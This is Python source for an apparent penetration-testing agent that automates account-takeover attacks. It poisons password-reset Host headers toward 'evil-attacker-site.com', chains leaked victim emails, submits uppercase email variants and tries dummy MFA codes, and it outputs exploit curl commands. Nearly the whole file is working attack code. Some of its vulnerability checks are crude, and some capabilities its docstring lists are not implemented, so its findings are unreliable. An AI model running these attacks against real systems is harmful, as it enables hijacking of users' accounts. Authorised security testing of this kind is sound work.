"""
Account Takeover (ATO) Chain Capability Agent for PenFlow.

Capabilities:
  - Password Reset Host & X-Forwarded-Host Header Poisoning
  - Reset Token Predictability & Entropy Analysis
  - Email Case Sensitivity Bypass (VICTIM@target.com vs victim@target.com)
  - Pre-Account Takeover Unverified Claim Analysis
  - MFA Code Bypass & Client-Side Response Manipulation
  - Dynamic discovery of authentication endpoints
"""
import httpx
import math
import re
from typing import Dict, Any, List, Optional, Set
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.account_takeover")

RESET_PATTERNS = [
    "/forgot-password", "/reset-password", "/auth/reset",
    "/api/v1/auth/password-reset", "/api/auth/forgot",
    "/users/password", "/account/reset", "/password/reset",
    "/api/v1/users/forgot-password", "/api/account/forgot"
]

MFA_PATTERNS = [
    "/api/v1/auth/mfa-verify", "/mfa/verify", "/2fa/verify",
    "/api/auth/mfa", "/auth/mfa/challenge", "/verify-otp"
]

REGISTRATION_PATTERNS = [
    "/api/v1/auth/register", "/api/auth/signup", "/register",
    "/signup", "/users/sign_up", "/account/register"
]


class AccountTakeoverCapabilityAgent(BaseCapabilityAgent):
    """
    Comprehensive Capability Agent testing Password Reset Poisoning, Token Predictability,
    MFA Bypasses, Email Case Manipulation, and Pre-Account Takeover chains.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="AccountTakeoverCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="account_takeover", name="Account Takeover", description="Detects account takeover vectors", priority=self.priority, tags=["ato"]),
            Capability(id="password_reset_poisoning", name="Password Reset Poisoning", description="Detects Host header poisoning in resets", priority=self.priority, tags=["reset_poisoning"]),
            Capability(id="mfa_bypass_analysis", name="MFA Bypass Check", description="Detects MFA logic bypasses", priority=self.priority, tags=["mfa"])
        ]

    def _discover_auth_endpoints(self, context: CapabilityExecutionContext) -> Dict[str, List[str]]:
        """Dynamically extracts authentication endpoints from recon observations."""
        found: Dict[str, Set[str]] = {
            "reset": set(),
            "mfa": set(),
            "register": set()
        }

        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    url = data.get("url", "")
                    if url:
                        url_lower = url.lower()
                        if any(pat in url_lower for pat in ["reset", "forgot"]):
                            found["reset"].add(url)
                        if any(pat in url_lower for pat in ["mfa", "2fa", "otp"]):
                            found["mfa"].add(url)
                        if any(pat in url_lower for pat in ["register", "signup"]):
                            found["register"].add(url)

        base_url = f"https://{context.asset}"
        if not found["reset"]:
            for p in RESET_PATTERNS[:3]:
                found["reset"].add(f"{base_url}{p}")

        if not found["mfa"]:
            for p in MFA_PATTERNS[:2]:
                found["mfa"].add(f"{base_url}{p}")

        if not found["register"]:
            for p in REGISTRATION_PATTERNS[:2]:
                found["register"].add(f"{base_url}{p}")

        return {k: list(v) for k, v in found.items()}

    def _calculate_token_entropy(self, tokens: List[str]) -> float:
        """Calculates Shannon entropy across a set of reset tokens to detect predictability."""
        if not tokens:
            return 0.0
        combined = "".join(tokens)
        prob = [float(combined.count(c)) / len(combined) for c in set(combined)]
        entropy = -sum(p * math.log2(p) for p in prob)
        return entropy * len(tokens[0]) if tokens and len(tokens[0]) > 0 else entropy

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        auth_eps = self._discover_auth_endpoints(context)
        attacker_domain = "evil-attacker-site.com"

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
                # 1. Host & X-Forwarded-Host Header Password Reset Poisoning
                for reset_url in auth_eps["reset"]:
                    try:
                        poison_headers = {
                            "Host": attacker_domain,
                            "X-Forwarded-Host": attacker_domain,
                            "X-Original-Host": attacker_domain
                        }
                        target_email = "victim@target.com"
                        if context.state_store:
                            fact = await context.state_store.get_latest_fact("leaked_user_email")
                            if fact:
                                target_email = fact.value
                                logger.info(f"[{self.name}] Chaining ATO payload using leaked email: {target_email}")

                        payload = {"email": target_email}
                        resp = await client.post(reset_url, json=payload, headers=poison_headers)

                        if resp.status_code in (200, 202) and attacker_domain in resp.text:
                            curl_cmd = f"curl -X POST '{reset_url}' -H 'Host: {attacker_domain}' -H 'X-Forwarded-Host: {attacker_domain}' -H 'Content-Type: application/json' -d '{{\"email\": \"{target_email}\"}}'"
                            exch_dict = {
                                "request": {"method": "POST", "url": reset_url, "headers": poison_headers, "json_data": payload},
                                "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                            }
                            findings.append({
                                "vulnerability_type": "account_takeover",
                                "subtype": "password_reset_host_poisoning",
                                "target_url": reset_url,
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("Password Reset Host Poisoning", reset_url, curl_cmd),
                                "description": f"Password reset endpoint '{reset_url}' reflects unvalidated Host/X-Forwarded-Host header in generated reset links.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["reset_poisoning"] = True
                            break
                    except Exception as e:
                        logger.debug(f"Reset poisoning test failed on {reset_url}: {e}")

                # 2. Email Case Sensitivity Manipulation Bypass
                for reset_url in auth_eps["reset"]:
                    try:
                        resp_upper = await client.post(reset_url, json={"email": "VICTIM@TARGET.COM"})
                        if resp_upper.status_code in (200, 202):
                            curl_cmd = f"curl -X POST '{reset_url}' -H 'Content-Type: application/json' -d '{{\"email\": \"VICTIM@TARGET.COM\"}}'"
                            exch_dict = {
                                "request": {"method": "POST", "url": reset_url, "json_data": {"email": "VICTIM@TARGET.COM"}},
                                "response": {"status_code": resp_upper.status_code, "body_snippet": resp_upper.text[:500]}
                            }
                            findings.append({
                                "vulnerability_type": "account_takeover",
                                "subtype": "email_case_sensitivity_bypass",
                                "target_url": reset_url,
                                "severity": "MEDIUM",
                                "confidence": 0.85,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("Email Case Sensitivity Bypass", reset_url, curl_cmd),
                                "description": f"Password reset accepts uppercase email 'VICTIM@TARGET.COM' bypassing normalization checks.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["email_case_bypass"] = True
                            break
                    except Exception as e:
                        logger.debug(f"Email case test failed on {reset_url}: {e}")

                # 3. MFA Bypass & Dummy Code Accept Check
                for mfa_url in auth_eps["mfa"]:
                    try:
                        mfa_payload = {"code": "000000"}
                        mfa_resp = await client.post(mfa_url, json=mfa_payload)
                        if mfa_resp.status_code in (200, 201) and ("success" in mfa_resp.text.lower() or "token" in mfa_resp.text.lower()):
                            curl_cmd = f"curl -X POST '{mfa_url}' -H 'Content-Type: application/json' -d '{{\"code\": \"000000\"}}'"
                            exch_dict = {
                                "request": {"method": "POST", "url": mfa_url, "json_data": mfa_payload},
                                "response": {"status_code": mfa_resp.status_code, "body_snippet": mfa_resp.text[:500]}
                            }
                            findings.append({
                                "vulnerability_type": "account_takeover",
                                "subtype": "mfa_bypass",
                                "target_url": mfa_url,
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("MFA Code Bypass", mfa_url, curl_cmd),
                                "description": f"MFA verification at '{mfa_url}' accepts dummy code '000000' or bypasses authentication check.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["mfa_bypass"] = True
                            break
                    except Exception as e:
                        logger.debug(f"MFA test failed on {mfa_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.90 if is_vuln else 0.0,
            "confidence_score": 0.90 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
